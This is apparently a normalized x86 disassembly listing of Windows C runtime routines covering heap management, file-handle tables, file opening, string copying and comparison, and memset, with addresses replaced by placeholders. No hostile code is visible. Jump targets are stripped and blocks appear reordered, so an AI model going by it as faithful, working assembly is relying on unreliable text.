mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_4079f0
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rw-data ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
sub_407aa1
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp r-xdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
test eax eax
jl r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe r-xdata
sub_407b9c
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx edi
lea esi [ eax + 0x17 ]
sub edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
and esi 0xfffffff0
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
dec ecx
cmp esi ecx
mov [ ebp + 0x10 ] ecx
mov ebx [ ecx + edi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
mov [ ebp + 0xc ] ebx
sar esi 0x4
dec esi
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov edx 0x80000000
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx esi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
mov edx 0x80000000
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx edi
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
shr edx cl
or [ eax ] edx
sub_407e92
push ecx
push ecx
push ebx
push ebp
push esi
push edi
push 0x12
or edi 0xffffffff
call sub_403c8c
xor ebx ebx
pop ecx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
mov ebp rw-data
mov esi 0x480
push esi
call sub_406abc
test eax eax
pop ecx
je r-xdata
lea eax [ esi + 0x480 ]
push 0x12
call sub_403ced
pop ecx
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
add [ rw-data ] 0x20
lea ecx [ ebx * 4 + rw-data ]
lea edx [ eax + 0x480 ]
mov [ ecx ] eax
add [ esp + 0x14 ] 0x20
add ebp 0x4
inc ebx
cmp ebp rw-data
mov [ esp + 0x10 ] ebx
jl r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl ebx 0x5
mov edi ebx
push edi
call sub_4080f2
pop ecx
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov edx [ ecx ]
add eax 0x24
add edx esi
jmp r-xdata
mov esi [ ebp ]
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp ]
add esi 0x24
add eax 0x480
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
cmp eax edx
jae r-xdata
cmp esi eax
jae r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
push 0x11
call sub_403c8c
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
or [ esi ] 0xffffffff
mov eax esi
sub eax [ ebp ]
push 0x24
pop ecx
cdq
idiv ecx
mov edi eax
add edi [ esp + 0x14 ]
cmp edi 0xffffffff
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
mov ebx [ esp + 0x10 ]
push 0x11
call sub_403ced
pop ecx
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov ebx [ esp + 0x10 ]
sub_407fb5
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
call sub_4057a8
mov [ eax ] 0x9
call sub_4057b1
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
cmp [ eax + esi ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ esp + 0x14 ]
jne r-xdata
mov eax [ edi ]
mov [ eax + esi ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub ecx 0x0
je r-xdata
pop edi
pop esi
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_408031
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
call sub_4057a8
mov [ eax ] 0x9
call sub_4057b1
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_4080b0
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
call sub_4057a8
mov [ eax ] 0x9
call sub_4057b1
and [ eax ] 0x0
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax * 4 + 0x4 ] 0x1
lea eax [ ecx + eax * 4 ]
je r-xdata
mov eax [ eax ]
retn
sub_4080f2
mov eax [ esp + 0x4 ]
push ebx
mov ecx eax
and eax 0x1f
sar ecx 0x5
push esi
push edi
mov esi [ ecx * 4 + rw-data ]
lea ebx [ ecx * 4 + rw-data ]
lea edi [ eax + eax * 8 ]
shl edi 0x2
add esi edi
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
pop edi
pop esi
pop ebx
retn
push 0x11
call sub_403c8c
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
push 0x11
call sub_403ced
pop ecx
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi + 0x8 ]
sub_408173
push ebx
mov ebx [ esp + 0x8 ]
cmp ebx [ rw-data ]
push esi
push edi
jae r-xdata
call sub_4057a8
mov [ eax ] 0x9
or eax 0xffffffff
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ebx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push ebx
call sub_4080f2
mov eax [ edi ]
pop ecx
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4057a8
mov [ eax ] 0x9
or esi 0xffffffff
push ebx
call sub_4080b0
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
xor esi esi
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push ebx
call sub_408151
pop ecx
mov eax esi
jmp r-xdata
call sub_4057b1
mov [ eax ] esi
test esi esi
je r-xdata
sub_408206
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
test cl 0x80
push edi
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] ebx
je r-xdata
and [ ebp - 0x1 ] 0x0
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push 0x3
mov eax ecx
pop esi
and eax esi
sub eax ebx
je r-xdata
test ch 0x40
jne r-xdata
mov eax 0x8000
test eax ecx
jne r-xdata
mov [ ebp - 0xc ] 0x80000000
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
cmp eax 0x20
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
dec eax
jne r-xdata
cmp ecx 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
cmp eax 0x30
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x10
je r-xdata
call sub_4057a8
mov [ eax ] 0x16
call sub_4057b1
mov [ eax ] ebx
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0xc ] 0xc0000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx 0x600
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
cmp ecx ebx
je r-xdata
mov edx 0x700
mov eax 0x400
and ecx edx
mov edi 0x100
cmp ecx eax
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
cmp eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x14 ]
test cl 0x80
jne r-xdata
mov [ ebp - 0x8 ] 0x5
jmp r-xdata
cmp ecx edx
je r-xdata
mov eax [ ebp + 0xc ]
mov esi 0x80
test edi eax
je r-xdata
cmp ecx edi
je r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test ah 0x10
je r-xdata
or esi 0x4000000
or [ ebp - 0xa ] 0x1
push 0x1
pop esi
mov [ ebp - 0x8 ] 0x4
jmp r-xdata
cmp ecx 0x200
je r-xdata
test al 0x20
je r-xdata
or esi edi
cmp ecx 0x300
jne r-xdata
test al 0x10
je r-xdata
or esi 0x8000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
call sub_407e92
mov ebx eax
or edi 0xffffffff
cmp ebx edi
jne r-xdata
or esi 0x10000000
push 0x0
push esi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
call sub_4057a8
mov [ eax ] 0x18
call sub_4057b1
and [ eax ] 0x0
mov eax edi
jmp r-xdata
push esi
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_405735
pop ecx
mov esi edi
jmp r-xdata
cmp eax 0x2
jne r-xdata
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
push ebx
call sub_408151
pop ecx
mov eax esi
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
push esi
push ebx
call sub_407fb5
mov eax ebx
pop ecx
sar eax 0x5
pop ecx
mov cl [ ebp - 0x1 ]
lea edi [ eax * 4 + rw-data ]
mov eax ebx
or cl 0x1
and eax 0x1f
mov [ ebp + 0xb ] cl
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
and [ ebp + 0xb ] 0x48
mov [ eax + esi + 0x4 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
cmp [ ebp + 0xb ] 0x0
jne r-xdata
test cl 0x80
je r-xdata
mov esi ebx
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x2
je r-xdata
mov eax [ edi ]
or [ eax + esi + 0x4 ] 0x20
lea eax [ eax + esi + 0x4 ]
push 0x2
push 0xffffffff
push ebx
call sub_40581f
add esp 0xc
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jne r-xdata
and [ ebp + 0x13 ] 0x0
lea eax [ ebp + 0x13 ]
push 0x1
push eax
push ebx
call sub_405224
add esp 0xc
test eax eax
jne r-xdata
call sub_4057b1
cmp [ eax ] 0x83
je r-xdata
push 0x0
push 0x0
push ebx
call sub_40581f
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x13 ] 0x1a
jne r-xdata
push ebx
call sub_404e72
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ ebp - 0x10 ]
push ebx
call sub_408d15
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
sub_4084e6
movzx eax [ esp + 0x4 ]
mov cl [ esp + 0xc ]
test [ eax + rw-data ] cl
jne r-xdata
push 0x1
pop eax
retn
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor eax eax
movzx eax [ eax * 2 + rw-data ]
and eax [ esp + 0x8 ]
jmp r-xdata
retn
test eax eax
jne r-xdata
sub_408520
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_408530
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_408610
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push ebx
call eax
mov ebx eax
sub_4086a0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
inc edi
dec ecx
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
dec ebx
jne r-xdata
dec ebx
jne r-xdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne r-xdata
add edi 0x4
xor eax eax
dec ecx
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_40879e
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
retn
sub_4087c0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_4087f0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_408850
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je r-xdata
or al al
je r-xdata
inc ecx
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_4088e0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
